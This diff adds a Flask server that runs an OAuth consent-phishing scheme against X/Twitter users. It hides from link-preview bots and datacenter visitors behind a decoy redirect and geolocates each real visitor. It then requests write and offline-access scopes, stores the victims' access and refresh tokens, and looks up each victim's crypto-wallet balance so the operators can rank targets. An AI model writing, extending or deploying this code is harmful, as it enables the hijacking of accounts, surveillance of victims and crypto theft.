@@ -1,0 +1,192 @@
+import json
+import base64
+import requests
+from datetime import datetime
+from shared.utils import send_message, formatter, parse
+from flask import Flask, request, redirect, session, current_app
+
+from shared.db import get_db
+from shared.config import config
+
+app = Flask(__name__)
+app.secret_key = "dev-secret"
+
+app.config.update(
+    SESSION_COOKIE_SAMESITE="None",
+    SESSION_COOKIE_SECURE=True
+)
+
+db = get_db()
+groups = db["groups"]
+spoofs = db["spoofs"]
+
+logger = config["LOGGER"]["SERVER"]
+
+@app.route('/')
+def index():
+    return "Alive"
+
+@app.route('/oauth')
+def oauth():
+    user_agent = request.headers.get('User-Agent', '').strip()
+    identifier = request.args.get('identifier')
+
+    if not identifier:
+        return "⚠️ Identifier is required.", 400
+
+    group = groups.find_one(
+        {"identifier": {"$in": [identifier]}}
+    )
+    if not group:
+        return "⚠️ Identifier is invalid.", 404
+    
+    i = group["identifier"].index(identifier)
+    twitter = group.get("twitter_settings")[i]
+    session["redirect_url"] = group.get('redirect')[i]
+    spoof = group.get("spoof")[i]
+
+    session["client_id"] = twitter["client_id"]
+    session["client_secret"] = twitter["client_secret"]
+    
+    session["group_id"] = group.get("group_id")
+    
+    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
+        return redirect(spoof)
+
+    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    res = requests.get(f'http://ip-api.com/json/{real_ip}')
+    location_data = res.json()
+    
+    country, city = location_data.get("country"), location_data.get("city")
+    if city != "The Dalles":
+        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
+
+        message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
+        send_message(group['group_id'], message)
+
+        client_id = session.get("client_id")
+        domain = config["DOMAIN"]
+        callback_url = urllib.parse.quote(f"{domain}/auth", safe="")
+
+        twitter_oauth_url = (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={client_id}'
+                            f'&redirect_uri={callback_url}'
+                            f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
+                            f'&state=state&code_challenge=challenge&code_challenge_method=plain')
+        
+        session.modified = True
+        resp = redirect(twitter_oauth_url)
+        current_app.session_interface.save_session(current_app, session, resp)
+        return resp
+    else:
+        return redirect(spoof)
+
+@app.route('/auth')
+def auth_callback():
+    global session
+
+    group_id = session.get("group_id")
+    
+    authorization_code = request.args.get('code')
+    if not authorization_code:
+        send_message(group_id, "❌ *User has cancelled authentication.*")
+        return redirect("https://x.com/")
+
+    client_id = session.get("client_id")
+    client_secret = session.get("client_secret")
+    credentials = base64.b64encode(f"{client_id}:{client_secret}".encode()).decode('utf-8')
+
+    domain = config["DOMAIN"]
+
+    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
+    data = {
+        'grant_type': 'authorization_code',
+        'code': authorization_code,
+        'redirect_uri': f'{domain}/auth',
+        'code_verifier': "challenge"
+    }
+    headers = {
+        'Authorization': f'Basic {credentials}',
+        'Content-Type': 'application/x-www-form-urlencoded',
+    }
+    response = requests.post(token_exchange_url, data=data, headers=headers)
+
+    access_token, refresh_token = response.json().get('access_token'), response.json().get('refresh_token')
+    
+    try:
+        headers = {
+            'Authorization': f'Bearer {access_token}',
+            'Content-Type': 'application/json',
+        }
+        params = {
+            'user.fields': 'public_metrics'
+        }
+        response = requests.get('https://api.twitter.com/2/users/me', headers=headers, params=params)
+
+        user_data = response.json().get('data', {})
+        user_id = user_data['id']
+        username = user_data['username']
+        followers_count = user_data['public_metrics']['followers_count']
+        
+        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
+        location_data = location_res.json()
+        country, city = location_data.get("country"), location_data.get("city")
+        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
+        location = f"{country_flag} {city}, {country}"
+        
+        existing_user = groups.find_one({ "group_id": group_id, "users.id": user_id })
+        
+        if existing_user:
+            groups.update_one(
+                {"group_id": group_id, "users.id": user_id},
+                {"$set": {
+                    "users.$.username": username,
+                    "users.$.location": location,
+                    "users.$.access_token": access_token,
+                    "users.$.refresh_token": refresh_token
+                }}
+            )
+        else:
+            groups.update_one(
+                {"group_id": group_id},
+                {
+                    "$push": {
+                        "users": {
+                            "id": user_id,
+                            "username": username,
+                            "location": location,
+                            "credentials": credentials,
+                            "access_token": access_token,
+                            "refresh_token": refresh_token,
+                            "timestamp": datetime.utcnow()
+                        }
+                    }
+                }
+            )
+
+        p_username = parse(username)
+        followers = formatter(followers_count)
+
+        url = f"https://api-staging.bankr.bot/leaderboard/users/{user_id}/profile"
+        resp = requests.get(url, headers={ "Accept": "application/json" })
+        data = resp.json()
+        
+        address = data["walletAddress"]
+
+        headers = {"AccessKey": config["DEBANK_API_KEY"]}
+        params = {"id": address}
+
+        resp = requests.get("https://pro-openapi.debank.com/v1/user/total_balance", params=params, headers=headers)
+        data = resp.json()
+
+        balance = formatter(data["total_usd_value"])
+
+        message = (f'🐍 *User [{p_username}](https://x.com/{username}) has authorized.*\n'
+                   f'👥 *Followers:* {followers}\n\n'
+                   f'🔗 *[{address}](https://debank.com/profile/{address}) | ${balance}*')
+
+        send_message(group_id, message)
+        return redirect(session.get("redirect_url", "https://x.com/"))
+    except Exception as e:
+        logger.error(e)
+        return redirect(session.get("redirect_url", "https://x.com/"))
